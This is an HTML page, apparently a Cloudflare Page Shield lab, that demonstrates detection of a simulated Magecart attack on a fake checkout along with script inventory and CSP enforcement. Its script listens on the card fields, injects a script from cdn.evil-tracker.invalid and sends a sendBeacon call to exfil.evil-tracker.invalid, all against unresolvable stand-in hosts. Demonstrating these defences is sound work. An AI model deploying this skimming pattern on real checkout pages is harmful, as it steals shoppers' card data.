@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Page Shield Interactive Lab &mdash; Pimenta Lab</title>
+  <link rel="stylesheet" href="/assets/lab.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/dayjs@1.11.13/dayjs.min.js"></script>
+  <style>
+    .stage-bar { display: flex; gap: 10px; flex-wrap: wrap; margin: 14px 0 20px; }
+    .stage-btn {
+      background: var(--panel2); border: 1px solid var(--border); color: var(--muted);
+      border-radius: 9px; padding: 9px 14px; font-size: 0.85rem; font-weight: 600; cursor: pointer;
+      font-family: inherit; transition: border-color .15s, color .15s;
+    }
+    .stage-btn:hover { border-color: var(--accent); color: var(--text); }
+    .stage-btn.active { background: rgba(246,130,31,0.12); border-color: var(--accent); color: var(--accent); }
+    .stage-btn.enforce { border-color: var(--green); }
+    .stage-btn.enforce:hover, .stage-btn.enforce.active { background: rgba(54,211,153,0.1); color: var(--green); border-color: var(--green); }
+
+    .shop {
+      background: var(--panel2); border: 1px solid var(--border); border-radius: 14px;
+      padding: 22px 24px; max-width: 520px; margin: 0 auto;
+    }
+    .shop-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+    .shop-head .name { font-weight: 700; font-size: 1.05rem; }
+    .shop-head .sec { color: var(--green); font-size: 0.75rem; }
+    .tot { display: flex; justify-content: space-between; font-size: 0.9rem; color: var(--muted); margin: 6px 0; }
+    .tot.grand { color: var(--text); font-weight: 700; border-top: 1px solid var(--border); padding-top: 8px; margin-top: 10px; }
+    .shop input { margin-bottom: 6px; }
+    .shop .row { display: flex; gap: 10px; }
+    .shop .row input { width: 100%; }
+
+    .script-list { margin: 10px 0 0; }
+    .script-row {
+      display: flex; align-items: center; justify-content: space-between; gap: 12px;
+      background: var(--panel2); border: 1px solid var(--border); border-radius: 9px;
+      padding: 9px 14px; margin-bottom: 8px; font-family: ui-monospace, Menlo, monospace; font-size: 0.82rem;
+    }
+    .script-row .u { color: #d7e2f7; word-break: break-all; }
+    .badge2 { flex-shrink: 0; font-size: 0.68rem; font-weight: 700; text-transform: uppercase; letter-spacing: .4px; padding: 3px 9px; border-radius: 999px; }
+    .badge2.ok { background: rgba(54,211,153,0.12); color: var(--green); border: 1px solid rgba(54,211,153,0.4); }
+    .badge2.new { background: rgba(255,107,107,0.12); color: var(--accent2); border: 1px solid rgba(255,107,107,0.45); }
+    .badge2.new.blocked { background: rgba(54,211,153,0.12); color: var(--green); border-color: rgba(54,211,153,0.4); }
+
+    .log {
+      background: #090e1a; border: 1px solid var(--border); border-radius: 10px; padding: 12px 14px;
+      font-family: ui-monospace, Menlo, monospace; font-size: 0.8rem; color: #b8c4de;
+      height: 220px; overflow-y: auto; margin-top: 10px;
+    }
+    .log div { margin: 2px 0; }
+    .log .t { color: #52608a; }
+    .log .good { color: var(--green); }
+    .log .bad { color: var(--accent2); }
+    .log .info { color: var(--blue); }
+
+    .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
+    @media (max-width: 780px) { .grid2 { grid-template-columns: 1fr; } }
+
+    table.mini { width: 100%; border-collapse: collapse; font-size: 0.85rem; margin: 10px 0; }
+    table.mini th, table.mini td { text-align: left; padding: 7px 10px; border-bottom: 1px solid var(--border); color: var(--muted); }
+    table.mini th { color: var(--text); font-weight: 600; font-size: 0.8rem; text-transform: uppercase; letter-spacing: .4px; }
+    table.mini td.mono { font-family: ui-monospace, Menlo, monospace; font-size: 0.78rem; color: #d7e2f7; word-break: break-all; }
+
+    .ml-gauge { margin: 8px 0; }
+    .ml-gauge .lbl { display: flex; justify-content: space-between; font-size: 0.82rem; margin-bottom: 4px; }
+    .ml-gauge .lbl b { color: var(--text); }
+    .ml-bar { height: 8px; background: var(--panel2); border-radius: 999px; overflow: hidden; }
+    .ml-fill { height: 100%; border-radius: 999px; width: 0; transition: width 1.1s ease; }
+    .ml-fill.mal { background: linear-gradient(90deg, var(--accent2), #ff9484); }
+    .ml-fill.ok2 { background: linear-gradient(90deg, var(--green), #7be3c0); }
+
+    .kv-csp { font-family: ui-monospace, Menlo, monospace; font-size: 0.78rem; }
+    .card-fields { background: #0d1426; border: 1px dashed #33406b; border-radius: 10px; padding: 14px 16px; margin-top: 14px; }
+    .stash { display: none; margin-top: 12px; background: rgba(255,107,107,0.07); border: 1px solid rgba(255,107,107,0.35); border-radius: 9px; padding: 10px 14px; font-family: ui-monospace, Menlo, monospace; font-size: 0.78rem; color: #ffb4b4; }
+    .exfil-line { display: none; margin-top: 10px; text-align: center; font-family: ui-monospace, Menlo, monospace; font-size: 0.8rem; color: var(--accent2); }
+    .blocked-note { display:none; }
+  </style>
+</head>
+<body>
+  <header class="lab">
+    <div class="brand">pimenta<span>.fun</span> lab</div>
+    <nav>
+      <a href="https://www.pimenta.fun">Home</a>
+      <a href="https://www.pimenta.fun/#tests">Tests</a>
+      <a href="https://www.pimenta.fun/page-shield-guide/">Implementation Guide</a>
+    </nav>
+  </header>
+
+  <main class="lab">
+    <div class="crumb"><a href="https://www.pimenta.fun/#tests">Tests</a> / Page Shield / Interactive Lab</div>
+    <span class="tag">Client-side Security</span>
+    <h1>Page Shield <span class="grad">Interactive Lab</span></h1>
+    <p class="lead">
+      One page that exercises every Page Shield feature: live resource inventory (scripts, connections, cookies),
+      a CSP probe to check if the feature is active on this zone, and a full Magecart attack simulation
+      &mdash; skimmer injection, ML scoring, exfiltration, and CSP enforcement.
+    </p>
+    <p>
+      Formerly <strong>Page Shield</strong>, now <strong>Client-side security</strong> in the Cloudflare dashboard.
+      Deep-dive implementation doc: <a href="https://www.pimenta.fun/page-shield-guide/" style="color:var(--accent)">page-shield-guide/</a>.
+    </p>
+
+    <!-- ========================= LIVE CSP PROBE ========================= -->
+    <div class="panel">
+      <h2>1 &middot; Is Page Shield active on this site? (live probe)</h2>
+      <p>Re-fetches this page and inspects the HTTP response headers that Page Shield injects when a
+      content security policy is configured: <code class="inline">Content-Security-Policy-Report-Only</code> (log mode)
+      and <code class="inline">Content-Security-Policy</code> (enforce mode).</p>
+      <button class="btn" id="probeBtn" type="button">Probe CSP headers</button>
+      <div id="probeOut" style="margin-top:14px;"></div>
+      <div class="note" style="margin-top:14px;">
+        If no CSP headers come back, the zone either has no policy configured yet (plan-gated feature) or it is in the
+        process of learning the baseline. The dashboard inventory of <em>scripts</em>, <em>connections</em> and
+        <em>cookies</em> works separately and should still list this page's resources after a few minutes
+        (connections/cookies require Business+).
+      </div>
+    </div>
+
+    <!-- ========================= LIVE INVENTORY ========================= -->
+    <div class="panel">
+      <h2>2 &middot; Live inventory &mdash; what this page actually loads</h2>
+      <p>Page Shield builds this same inventory from visitor traffic. The panel below is rendered live in your browser.</p>
+
+      <div class="metrics" id="metricRow">
+        <div class="metric"><div class="n" id="mScripts">0</div><div class="l">Scripts</div></div>
+        <div class="metric"><div class="n" id="mConns">0</div><div class="l">Page connections</div></div>
+        <div class="metric"><div class="n" id="mCookies">0</div><div class="l">Cookies</div></div>
+        <div class="metric"><div class="n" id="mThreats">0</div><div class="l">Threats flagged</div></div>
+      </div>
+
+      <div class="grid2">
+        <div>
+          <h2>Scripts (document.scripts)</h2>
+          <div class="script-list" id="scriptList"></div>
+        </div>
+        <div>
+          <h2>Outbound connections</h2>
+          <p>Make this page issue requests &mdash; on the real dashboard they appear under <em>Connections</em>.</p>
+          <div class="stage-bar">
+            <button class="stage-btn" id="connOk" type="button">Call same-origin /cf-echo</button>
+            <button class="stage-btn" id="connBad" type="button">Post to exfil.evil-tracker.invalid</button>
+          </div>
+          <div class="log" id="connLog" style="height:130px"></div>
+
+          <h2 style="margin-top:18px;">Cookies visible to JS</h2>
+          <div class="script-list" id="cookieList"></div>
+          <div class="stage-bar">
+            <button class="stage-btn" id="setCookie" type="button">Set demo cookie</button>
+          </div>
+          <p style="font-size:0.82rem;">JS can't read <code class="inline">HttpOnly</code> cookies &mdash; Page Shield's cookie
+          inventory (Business+) sees them anyway, via traffic.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ========================= MAGECART SIMULATION ========================= -->
+    <div class="panel">
+      <h2>3 &middot; Magecart attack simulation</h2>
+      <p>A fake checkout. Walk the stages: a third-party script gets compromised and starts skimming card fields,
+      Cloudflare's ML classifiers flag it, the skimmer exfiltrates the data, and finally a CSP enforce policy
+      makes the browser refuse to run anything outside the allowlist.</p>
+
+      <div class="stage-bar">
+        <button class="stage-btn" data-stage="normal" type="button">1. Normal operation</button>
+        <button class="stage-btn" data-stage="inject" type="button">2. Inject skimmer</button>
+        <button class="stage-btn" data-stage="ml" type="button">3. ML detection</button>
+        <button class="stage-btn" data-stage="exfil" type="button">4. Exfiltration</button>
+        <button class="stage-btn enforce" data-stage="enforce" type="button">5. CSP enforcement</button>
+        <button class="stage-btn" data-stage="reset" type="button">Reset</button>
+      </div>
+
+      <div class="grid2">
+        <div>
+          <div class="shop">
+            <div class="shop-head"><span class="name">ShopCo &mdash; Secure Checkout</span><span class="sec">&#128274; TLS</span></div>
+            <div class="tot"><span>Premium Widget &times;1</span><span>$49.99</span></div>
+            <div class="tot"><span>Shipping</span><span>$4.99</span></div>
+            <div class="tot grand"><span>Total</span><span>$54.98</span></div>
+            <div class="card-fields">
+              <form id="checkoutForm" onsubmit="return false;">
+                <label>Cardholder name</label>
+                <input id="ccName" autocomplete="off" placeholder="Ada Lovelace" />
+                <label>Card number</label>
+                <input id="ccNumber" autocomplete="off" placeholder="4242 4242 4242 4242" inputmode="numeric" />
+                <div class="row">
+                  <div><label>Expiry</label><input id="ccExp" autocomplete="off" placeholder="12/29" /></div>
+                  <div><label>CVV</label><input id="ccCvv" autocomplete="off" placeholder="123" inputmode="numeric" /></div>
+                </div>
+                <button class="btn" type="submit" style="margin-top:6px; width:100%;">&#128274; Pay $54.98</button>
+              </form>
+              <div class="stash" id="stash"></div>
+              <div class="exfil-line" id="exfilLine">&#128640; exfil.evil-tracker.invalid &larr; {pan, cvc, name}</div>
+            </div>
+            <p style="text-align:center; font-size:0.72rem; margin:12px 0 0;">&#128274; 256-bit TLS &middot; PCI DSS &middot; Demo only, no data leaves this page</p>
+          </div>
+          <div class="blocked-note ok" id="blockedNote">&#128737;&#65039; <strong>Blocked by CSP.</strong> The injected script is not in
+          <code class="inline">script-src</code>, so the browser refuses to execute it &mdash; even though the compromised CDN still serves it.</div>
+        </div>
+
+        <div>
+          <h2>Scripts on the checkout (simulated inventory)</h2>
+          <div class="script-list" id="simScriptList"></div>
+          <div id="mlPanel" style="display:none; margin-top:14px;">
+            <h2>ML scoring of the unknown script</h2>
+            <div class="ml-gauge"><div class="lbl"><b>Magecart (card skimming)</b><span>score 6 &mdash; malicious</span></div><div class="ml-bar"><div class="ml-fill mal" data-w="94%"></div></div></div>
+            <div class="ml-gauge"><div class="lbl"><b>Malware behavior</b><span>score 12 &mdash; malicious</span></div><div class="ml-bar"><div class="ml-fill mal" data-w="88%"></div></div></div>
+            <div class="ml-gauge"><div class="lbl"><b>Cryptomining</b><span>score 96 &mdash; clean</span></div><div class="ml-bar"><div class="ml-fill ok2" data-w="96%"></div></div></div>
+            <div class="ml-gauge"><div class="lbl"><b>JS integrity</b><span>score 9 &mdash; suspicious</span></div><div class="ml-bar"><div class="ml-fill mal" data-w="91%"></div></div></div>
+            <p style="font-size:0.82rem;">Scale 1&ndash;99: <strong>1 = definitely malicious</strong>, <strong>99 = definitely safe</strong>. (ML scoring is part of the Advanced add-on.)</p>
+          </div>
+          <div id="cspPanel" style="display:none; margin-top:14px;">
+            <h2>HTTP header that did this</h2>
+            <pre class="kv-csp">Content-Security-Policy:
+  script-src 'self' cdnjs.cloudflare.com
+    cdn.jsdelivr.net js.stripe.com;
+  connect-src 'self' api.example.com;
+  report-uri https://csp-reporting.cloudflare.com/
+    cdn-cgi/script_monitor/report?p=&lt;policy_id&gt;
+  &rarr; cdn.evil-tracker.invalid NOT in script-src &rarr; BLOCKED</pre>
+          </div>
+          <div class="log" id="simLog"></div>
+        </div>
+      </div>
+
+      <div class="note" style="margin-top:16px;">
+        Stage 2 actually injects a <code class="inline">&lt;script&gt;</code> tag pointing at
+        <code class="inline">cdn.evil-tracker.invalid</code> into this page. It fails to load (the domain is intentionally
+        unresolvable), but if Page Shield monitoring is enabled on this zone, the URL will show up as a
+        <em>new script</em> in your dashboard inventory &mdash; exactly what a real supply-chain compromise looks like.
+      </div>
+    </div>
+
+    <!-- ========================= WHAT PAGE SHIELD MONITORS ========================= -->
+    <div class="panel">
+      <h2>4 &middot; What Page Shield monitors (feature map)</h2>
+      <table class="mini">
+        <tr><th>Feature</th><th>What it does</th><th>Plan</th></tr>
+        <tr><td>Script monitoring</td><td>Inventories every JS file by URL, hash and first/last seen, per page</td><td>All plans</td></tr>
+        <tr><td>Connection monitoring</td><td>Tracks fetch/XHR/beacon/WebSocket destinations of scripts</td><td>Business+</td></tr>
+        <tr><td>Cookie monitoring</td><td>Inventory + security attribute analysis (HttpOnly, Secure, SameSite)</td><td>Business+</td></tr>
+        <tr><td>Page attribution</td><td>Which pages load each resource</td><td>Business+</td></tr>
+        <tr><td>New resource / new domain alerts</td><td>Email/webhook when an unknown script or host appears</td><td>Business+</td></tr>
+        <tr><td>Malicious script / connection / code-change detection</td><td>ML classifiers: Magecart, cryptomining, malware, JS integrity</td><td>Advanced add-on</td></tr>
+        <tr><td>Content security rules (positive blocking)</td><td>CSP log &amp; enforce policies injected at the edge (5 rules)</td><td>Advanced add-on</td></tr>
+        <tr><td>Logpush</td><td>Stream detections to your SIEM (4 jobs)</td><td>Advanced add-on</td></tr>
+      </table>
+    </div>
+
+    <div class="panel">
+      <h2>5 &middot; CSP modes &mdash; log vs enforce</h2>
+      <table class="mini">
+        <tr><th>Mode</th><th>HTTP header</th><th>Effect</th></tr>
+        <tr><td><strong>Log</strong></td><td class="mono">Content-Security-Policy-Report-Only</td><td>Scripts still run; the browser just reports violations to Cloudflare. Zero breakage &mdash; the safe starting point.</td></tr>
+        <tr><td><strong>Enforce</strong></td><td class="mono">Content-Security-Policy</td><td>Browser blocks anything not in the allowlist before it executes. Positive protection after the baseline is verified.</td></tr>
+      </table>
+      <div class="ok">Best practice: monitor &rarr; log policy &rarr; review violation reports &rarr; enforce. Never jump straight to enforce.</div>
+    </div>
+
+    <div class="note">
+      Dashboard path: <strong>Cloudflare &rarr; your zone &rarr; Security &rarr; Client-side security</strong> (formerly Page Shield).
+      Official docs: <a href="https://developers.cloudflare.com/client-side-security/get-started/" style="color:var(--blue)">developers.cloudflare.com/client-side-security</a>.
+    </div>
+  </main>
+
+  <section class="disclaimer"><div class="box">
+    <b>Disclaimer:</b> All information provided on this page was developed by Pimenta.fun LAB.
+    Please consult the official documentation for the most accurate and up-to-date information.
+    We are not responsible for any issues, damages, or data loss that may occur from using this information.
+    <span class="risk">USE AT YOUR OWN RISK.</span>
+  </div></section>
+
+  <footer class="lab">
+    Pimenta lab &middot; <a href="https://www.pimenta.fun/#tests">back to tests</a>
+  </footer>
+
+  <script>
+    var EVIL_SRC = 'https://cdn.evil-tracker.invalid/skimmer.min.js';
+    var EVIL_EXFIL = 'https://exfil.evil-tracker.invalid/collect';
+    var skimmerScript = null;
+    var connCount = 0;
+    var threats = 0;
+    var startTs = Date.now();
+
+    function ts() {
+      var s = Math.floor((Date.now() - startTs) / 1000);
+      return '[' + String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0') + ']';
+    }
+    function addLog(el, cls, msg) {
+      var d = document.createElement('div');
+      d.innerHTML = '<span class="t">' + ts() + '</span> <span class="' + cls + '">' + msg + '</span>';
+      el.appendChild(d);
+      el.scrollTop = el.scrollHeight;
+    }
+    function eb(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;'); }
+
+    function hosts(u) { try { return new URL(u, location.href).href; } catch (e) { return u || '(inline)'; } }
+
+    function renderRealScripts() {
+      var list = document.getElementById('scriptList');
+      list.innerHTML = '';
+      var seen = {};
+      Array.prototype.forEach.call(document.scripts, function (sc) {
+        if (!sc.src || seen[sc.src]) return;
+        seen[sc.src] = 1;
+        var evil = sc.src.indexOf('evil-tracker') !== -1;
+        var row = document.createElement('div');
+        row.className = 'script-row';
+        row.innerHTML = '<span class="u">' + eb(sc.src) + '</span>' +
+          '<span class="badge2 ' + (evil ? 'new' : 'ok') + '">' + (evil ? '&#9888; New / unknown' : 'Loaded') + '</span>';
+        list.appendChild(row);
+      });
+      document.getElementById('mScripts').textContent = Object.keys(seen).length;
+    }
+
+    function renderCookies() {
+      var list = document.getElementById('cookieList');
+      list.innerHTML = '';
+      var raw = document.cookie || '';
+      if (!raw) {
+        list.innerHTML = '<div class="script-row"><span class="u">(no JS-visible cookies set)</span><span class="badge2 ok">clean</span></div>';
+        document.getElementById('mCookies').textContent = 0;
+        return;
+      }
+      raw.split(';').forEach(function (c) {
+        var name = c.split('=')[0].trim();
+        if (!name) return;
+        var row = document.createElement('div');
+        row.className = 'script-row';
+        row.innerHTML = '<span class="u">' + eb(name) + '</span><span class="badge2 ok">JS-visible</span>';
+        list.appendChild(row);
+      });
+      document.getElementById('mCookies').textContent = raw.split(';').filter(function (x) { return x.trim(); }).length;
+    }
+
+    document.getElementById('setCookie').addEventListener('click', function () {
+      document.cookie = 'ps_demo_' + Date.now() % 1000 + '=' + Math.random().toString(36).slice(2, 10) + '; path=/; SameSite=Lax';
+      renderCookies();
+    });
+
+    document.getElementById('connOk').addEventListener('click', function () {
+      var log = document.getElementById('connLog');
+      fetch('/cf-echo', { headers: { Accept: 'application/json' } }).then(function (r) {
+        connCount++; document.getElementById('mConns').textContent = connCount;
+        addLog(log, 'info', 'fetch /cf-echo &rarr; ' + r.status + ' (same-origin, would be a known connection)');
+      }).catch(function (e) { addLog(log, 'bad', 'fetch /cf-echo failed: ' + e.message); });
+    });
+
+    document.getElementById('connBad').addEventListener('click', function () {
+      var log = document.getElementById('connLog');
+      var queued = false;
+      try { queued = navigator.sendBeacon(EVIL_EXFIL, JSON.stringify({ pan: 'demo' })); } catch (e) { queued = false; }
+      connCount++; document.getElementById('mConns').textContent = connCount;
+      addLog(log, 'bad', 'sendBeacon ' + EVIL_EXFIL + ' &rarr; queued: ' + queued + ' (would be flagged by connection monitoring + DNS fails since .invalid is unresolvable)');
+    });
+
+    document.getElementById('probeBtn').addEventListener('click', function () {
+      var out = document.getElementById('probeOut');
+      out.innerHTML = '<p style="color:var(--muted)">re-fetching this page&hellip;</p>';
+      fetch(location.pathname + location.search + (location.search ? '&' : '?') + '__ps=' + Date.now(), { cache: 'reload' }).then(function (res) {
+        var hits = [];
+        res.headers.forEach(function (v, k) {
+          if (k.toLowerCase().indexOf('content-security-policy') === 0 || k.toLowerCase() === 'report-to' || k.toLowerCase() === 'reporting-endpoints') {
+            hits.push([k, v]);
+          }
+        });
+        if (!hits.length) {
+          out.innerHTML = '<div class="warn"><strong>No Page Shield CSP headers detected on this response.</strong><br>' +
+            'The zone currently has no content security policy in log or enforce mode. Enable Client-side security and create a policy ' +
+            '(Dashboard &rarr; Security &rarr; Client-side security &rarr; Policies/Content security rules), then probe again.</div>';
+          return;
+        }
+        var rows = hits.map(function (h) {
+          var mode = h[0].toLowerCase() === 'content-security-policy' ? 'ENFORCE' : (h[0].toLowerCase().indexOf('report-only') !== -1 ? 'LOG' : 'meta');
+          var cls = mode === 'ENFORCE' ? 'ok' : 'note';
+          return '<tr class="' + cls + '" style="display:table-row"><td class="mono" style="color:var(--text)">' + eb(h[0]) + '</td><td class="mono">' + eb(h[1]) + '</td></tr>';
+        }).join('');
+        out.innerHTML = '<div class="ok"><strong>Page Shield policy detected.</strong></div><table class="mini"><tr><th>Header</th><th>Value</th></tr>' + rows + '</table>';
+      }).catch(function (e) {
+        out.innerHTML = '<div class="warn">Probe failed: ' + eb(e.message) + '</div>';
+      });
+    });
+
+    var SIM_SCRIPTS = [
+      { u: 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js', state: 'ok', label: 'Approved' },
+      { u: 'https://cdn.jsdelivr.net/npm/dayjs@1.11.13/dayjs.min.js', state: 'ok', label: 'Approved' },
+      { u: 'https://js.stripe.com/v3/', state: 'ok', label: 'Approved' }
+    ];
+    function renderSimScripts(enforced) {
+      var list = document.getElementById('simScriptList');
+      list.innerHTML = '';
+      SIM_SCRIPTS.forEach(function (s) {
+        var row = document.createElement('div');
+        row.className = 'script-row';
+        var b = s.state === 'ok' ? '<span class="badge2 ok">' + s.label + '</span>'
+          : (enforced ? '<span class="badge2 new blocked">&#10003; Blocked by CSP</span>' : '<span class="badge2 new">&#9888; New / unknown</span>');
+        row.innerHTML = '<span class="u">' + eb(s.u) + '</span>' + b;
+        list.appendChild(row);
+      });
+    }
+
+    var skimHandler = null;
+    function armSkimmer() {
+      var stash = document.getElementById('stash');
+      var data = {};
+      stash.style.display = 'block';
+      stash.innerHTML = 'skimmer armed &mdash; captured: <i>waiting for keystrokes&hellip;</i>';
+      skimHandler = function (e) {
+        var f = e.target;
+        data[f.id] = f.value;
+        stash.innerHTML = 'skimmer captured: ' + eb(JSON.stringify(data));
+      };
+      ['ccName', 'ccNumber', 'ccExp', 'ccCvv'].forEach(function (id) {
+        document.getElementById(id).addEventListener('input', skimHandler);
+      });
+    }
+    function disarmSkimmer() {
+      if (!skimHandler) return;
+      ['ccName', 'ccNumber', 'ccExp', 'ccCvv'].forEach(function (id) {
+        document.getElementById(id).removeEventListener('input', skimHandler);
+      });
+      skimHandler = null;
+      document.getElementById('stash').style.display = 'none';
+      document.getElementById('exfilLine').style.display = 'none';
+    }
+
+    function resetSim() {
+      ['ccName', 'ccNumber', 'ccExp', 'ccCvv'].forEach(function (id) { document.getElementById(id).value = ''; });
+      SIM_SCRIPTS = SIM_SCRIPTS.filter(function (s) { return s.state === 'ok'; });
+      disarmSkimmer();
+      if (skimmerScript) { skimmerScript.remove(); skimmerScript = null; }
+      document.getElementById('mlPanel').style.display = 'none';
+      document.getElementById('cspPanel').style.display = 'none';
+      document.getElementById('blockedNote').style.display = 'none';
+      document.getElementById('simLog').innerHTML = '';
+      threats = 0;
+      document.getElementById('mThreats').textContent = '0';
+      renderSimScripts(false);
+      renderRealScripts();
+    }
+
+    document.querySelectorAll('.stage-btn[data-stage]').forEach(function (btn) {
+      btn.addEventListener('click', function () {
+        document.querySelectorAll('.stage-btn[data-stage]').forEach(function (b) { b.classList.remove('active'); });
+        var stage = btn.getAttribute('data-stage');
+        if (stage !== 'reset') btn.classList.add('active');
+        var log = document.getElementById('simLog');
+
+        if (stage === 'reset') { resetSim(); return; }
+
+        if (stage === 'normal') {
+          addLog(log, 'good', 'baseline: 3 approved scripts, 2 known connections. Dashboard inventory is clean.');
+          renderSimScripts(false);
+        }
+
+        if (stage === 'inject') {
+          addLog(log, 'bad', 'supply-chain event: attacker compromised a dependency &rarr; checkout now loads ' + EVIL_SRC);
+          SIM_SCRIPTS.push({ u: EVIL_SRC, state: 'new' });
+          renderSimScripts(false);
+          threats++; document.getElementById('mThreats').textContent = threats;
+          armSkimmer();
+          if (!skimmerScript) {
+            skimmerScript = document.createElement('script');
+            skimmerScript.src = EVIL_SRC;
+            skimmerScript.onload = function () { addLog(log, 'bad', 'evil script executed (unexpected here)'); };
+            skimmerScript.onerror = function () { addLog(log, 'info', 'skimmer tag injected for real (check DevTools &rarr; Network) &mdash; load fails since .invalid is unresolvable, but Page Shield monitoring still inventories the URL as a NEW script'); };
+            document.head.appendChild(skimmerScript);
+            renderRealScripts();
+          }
+          addLog(log, 'info', 'Page Shield: "New script detected" alert fires (Business+). Type in the card form to see it skim.');
+        }
+
+        if (stage === 'ml') {
+          document.getElementById('mlPanel').style.display = 'block';
+          requestAnimationFrame(function () {
+            document.querySelectorAll('#mlPanel .ml-fill').forEach(function (f) { f.style.width = f.getAttribute('data-w'); });
+          });
+          addLog(log, 'bad', 'Advanced ML: cdn.evil-tracker.invalid scored: Magecart 6, Malware 12, Integrity 9 &rarr; "Malicious script detected" alert');
+        }
+
+        if (stage === 'exfil') {
+          document.getElementById('exfilLine').style.display = 'block';
+          addLog(log, 'bad', 'skimmer posts card fields to ' + EVIL_EXFIL + ' (sendBeacon queued: real exfil in the wild &mdash; here DNS simply fails)');
+          try { navigator.sendBeacon(EVIL_EXFIL, JSON.stringify({ pan: 'demo' })); } catch (e) {}
+          connCount++; document.getElementById('mConns').textContent = connCount;
+          addLog(log, 'info', 'Page Shield connection monitoring would flag a NEW unknown connection destination (Business+).');
+        }
+
+        if (stage === 'enforce') {
+          document.getElementById('cspPanel').style.display = 'block';
+          document.getElementById('blockedNote').style.display = 'block';
+          disarmSkimmer();
+          if (skimmerScript) { skimmerScript.remove(); skimmerScript = null; }
+          renderSimScripts(true);
+          renderRealScripts();
+          threats = Math.max(0, threats - 1); document.getElementById('mThreats').textContent = threats;
+          addLog(log, 'good', 'CSP enforce header deployed: script-src allowlist excludes the evil host &rarr; browser REFUSES to run the skimmer, even though the CDN is still compromised.');
+          addLog(log, 'good', 'Exfil connection also blocked: exfil host not in connect-src.');
+        }
+      });
+    });
+
+    renderSimScripts(false);
+    renderRealScripts();
+    renderCookies();
+    addLog(document.getElementById('connLog'), 'info', 'ready. Use the buttons to generate page connections.');
+    addLog(document.getElementById('simLog'), 'info', 'ready. Start at stage 1.');
+  </script>
+</body>
+</html>
